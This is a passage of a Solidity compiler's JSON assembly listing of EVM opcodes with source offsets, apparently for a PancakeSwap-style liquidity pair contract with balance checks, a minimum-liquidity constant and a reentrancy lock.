											"begin": 6455,
											"end": 6494,
											"name": "POP"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "POP"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "MLOAD"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "281"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "281"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "MLOAD"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "SLOAD"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP2"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "MSTORE"
										},
										{
											"begin": 6553,
											"end": 6557,
											"name": "ADDRESS"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP3"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "ADD"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "MSTORE"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "MLOAD"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP3"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6504,
											"end": 6517,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6504,
											"end": 6517,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "SWAP1"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "SWAP3"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "AND"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "SWAP2"
										},
										{
											"begin": 6520,
											"end": 6544,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 6520,
											"end": 6544,
											"name": "SWAP2"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP3"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "ADD"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP3"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6455,
											"end": 6494,
											"name": "SWAP3"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP2"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP3"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SUB"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "ADD"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP2"
										},
										{
											"begin": 6527,
											"end": 6533,
											"name": "DUP7"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "DUP1"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "282"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "282"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "POP"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "GAS"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "STATICCALL"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "283"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "283"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "POP"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "POP"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "POP"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "POP"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "MLOAD"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "284"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "284"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "MLOAD"
										},
										{
											"begin": 6520,
											"end": 6559,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6569,
											"end": 6581,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "PUSH [tag]",
											"value": "285"
										},
										{
											"begin": 6584,
											"end": 6592,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "DUP8"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "AND"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6584,
											"end": 6596,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "AND"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "tag",
											"value": "285"
										},
										{
											"begin": 6584,
											"end": 6607,
											"name": "JUMPDEST"
										},
										{
											"begin": 6569,
											"end": 6607,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6617,
											"end": 6629,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "PUSH [tag]",
											"value": "286"
										},
										{
											"begin": 6632,
											"end": 6640,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "DUP8"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "AND"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6632,
											"end": 6644,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "AND"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "tag",
											"value": "286"
										},
										{
											"begin": 6632,
											"end": 6655,
											"name": "JUMPDEST"
										},
										{
											"begin": 6617,
											"end": 6655,
											"name": "SWAP1"
										},
										{
											"begin": 6617,
											"end": 6655,
											"name": "POP"
										},
										{
											"begin": 6666,
											"end": 6676,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6679,
											"end": 6709,
											"name": "PUSH [tag]",
											"value": "287"
										},
										{
											"begin": 6688,
											"end": 6697,
											"name": "DUP8"
										},
										{
											"begin": 6699,
											"end": 6708,
											"name": "DUP8"
										},
										{
											"begin": 6679,
											"end": 6687,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 6679,
											"end": 6709,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6679,
											"end": 6709,
											"name": "tag",
											"value": "287"
										},
										{
											"begin": 6679,
											"end": 6709,
											"name": "JUMPDEST"
										},
										{
											"begin": 6719,
											"end": 6736,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6739,
											"end": 6750,
											"name": "SLOAD"
										},
										{
											"begin": 6666,
											"end": 6709,
											"name": "SWAP1"
										},
										{
											"begin": 6666,
											"end": 6709,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6842,
											"end": 6859,
											"name": "DUP1"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "PUSH [tag]",
											"value": "288"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "JUMPI"
										},
										{
											"begin": 6887,
											"end": 6941,
											"name": "PUSH [tag]",
											"value": "289"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 6887,
											"end": 6918,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 6897,
											"end": 6917,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": 6897,
											"end": 6904,
											"name": "DUP8"
										},
										{
											"begin": 6909,
											"end": 6916,
											"name": "DUP8"
										},
										{
											"begin": 6897,
											"end": 6917,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6897,
											"end": 6908,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 6897,
											"end": 6917,
											"name": "AND"
										},
										{
											"begin": 6897,
											"end": 6917,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6887,
											"end": 6941,
											"name": "tag",
											"value": "289"
										},
										{
											"begin": 6887,
											"end": 6941,
											"name": "JUMPDEST"
										},
										{
											"begin": 6875,
											"end": 6941,
											"name": "SWAP9"
										},
										{
											"begin": 6875,
											"end": 6941,
											"name": "POP"
										},
										{
											"begin": 6955,
											"end": 6996,
											"name": "PUSH [tag]",
											"value": "292"
										},
										{
											"begin": 6974,
											"end": 6975,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 6955,
											"end": 6965,
											"name": "PUSH [tag]",
											"value": "293"
										},
										{
											"begin": 6955,
											"end": 6996,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6955,
											"end": 6996,
											"name": "tag",
											"value": "292"
										},
										{
											"begin": 6955,
											"end": 6996,
											"name": "JUMPDEST"
										},
										{
											"begin": 6955,
											"end": 6996,
											"name": "POP"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "PUSH [tag]",
											"value": "294"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "JUMP"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "tag",
											"value": "288"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "JUMPDEST"
										},
										{
											"begin": 7094,
											"end": 7226,
											"name": "PUSH [tag]",
											"value": "295"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7120,
											"end": 7157,
											"name": "DUP10"
										},
										{
											"begin": 7120,
											"end": 7157,
											"name": "AND"
										},
										{
											"begin": 7120,
											"end": 7145,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 7120,
											"end": 7127,
											"name": "DUP7"
										},
										{
											"begin": 7132,
											"end": 7144,
											"name": "DUP5"
										},
										{
											"begin": 7120,
											"end": 7145,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 7120,
											"end": 7131,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 7120,
											"end": 7145,
											"name": "AND"
										},
										{
											"begin": 7120,
											"end": 7145,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7094,
											"end": 7226,
											"name": "tag",
											"value": "295"
										},
										{
											"begin": 7094,
											"end": 7226,
											"name": "JUMPDEST"
										},
										{
											"begin": 7082,
											"end": 7226,
											"name": "SWAP9"
										},
										{
											"begin": 7082,
											"end": 7226,
											"name": "POP"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "tag",
											"value": "294"
										},
										{
											"begin": 6838,
											"end": 7237,
											"name": "JUMPDEST"
										},
										{
											"begin": 7266,
											"end": 7267,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7254,
											"end": 7263,
											"name": "DUP10"
										},
										{
											"begin": 7254,
											"end": 7267,
											"name": "GT"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH [tag]",
											"value": "300"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "JUMPI"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP2"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "MSTORE"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "ADD"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP1"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP1"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "ADD"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP3"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP2"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "SUB"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP3"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "MSTORE"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "28"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP2"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "MSTORE"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "ADD"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP1"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH data",
											"value": "6591C9F5BF1FEFAAD109B76A20E25C857B696080C952191F86220F001A83663E"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "28"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "SWAP2"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "CODECOPY"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "ADD"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "SWAP2"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "POP"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "POP"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "MLOAD"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "DUP1"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "SWAP2"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "SUB"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "SWAP1"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "REVERT"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "tag",
											"value": "300"
										},
										{
											"begin": 7246,
											"end": 7312,
											"name": "JUMPDEST"
										},
										{
											"begin": 7322,
											"end": 7347,
											"name": "PUSH [tag]",
											"value": "301"
										},
										{
											"begin": 7333,
											"end": 7335,
											"name": "DUP11"
										},
										{
											"begin": 7337,
											"end": 7346,
											"name": "DUP11"
										},
										{
											"begin": 7322,
											"end": 7332,
											"name": "PUSH [tag]",
											"value": "293"
										},
										{
											"begin": 7322,
											"end": 7347,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7322,
											"end": 7347,
											"name": "tag",
											"value": "301"
										},
										{
											"begin": 7322,
											"end": 7347,
											"name": "JUMPDEST"
										},
										{
											"begin": 7322,
											"end": 7347,
											"name": "POP"
										},
										{
											"begin": 7358,
											"end": 7407,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 7366,
											"end": 7374,
											"name": "DUP7"
										},
										{
											"begin": 7376,
											"end": 7384,
											"name": "DUP7"
										},
										{
											"begin": 7386,
											"end": 7395,
											"name": "DUP11"
										},
										{
											"begin": 7397,
											"end": 7406,
											"name": "DUP11"
										},
										{
											"begin": 7358,
											"end": 7365,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 7358,
											"end": 7407,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "123"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP5"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SLOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "tag",
											"value": "125"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMPDEST"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "SLOAD"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "DUP2"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "tag",
											"value": "127"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "JUMPDEST"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "SLOAD"
										},
										{
											"begin": 1191,
											"end": 1192,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1179,
											"end": 1192,
											"name": "EQ"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH [tag]",
											"value": "306"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPI"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SUB"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "REVERT"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "tag",
											"value": "306"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPDEST"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1222,
											"end": 1230,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SSTORE"
										},
										{
											"begin": 18236,
											"end": 18242,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 18236,
											"end": 18242,
											"name": "SLOAD"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP1"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP2"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "MSTORE"
										},
										{
											"begin": 18262,
											"end": 18266,
											"name": "ADDRESS"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP3"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "ADD"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "MSTORE"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP1"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "MLOAD"
										},
										{
											"begin": 18208,
											"end": 18375,
											"name": "PUSH [tag]",
											"value": "308"
										},
										{
											"begin": 18208,
											"end": 18375,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18236,
											"end": 18242,
											"name": "AND"
										},
										{
											"begin": 18236,
											"end": 18242,
											"name": "SWAP2"
										},
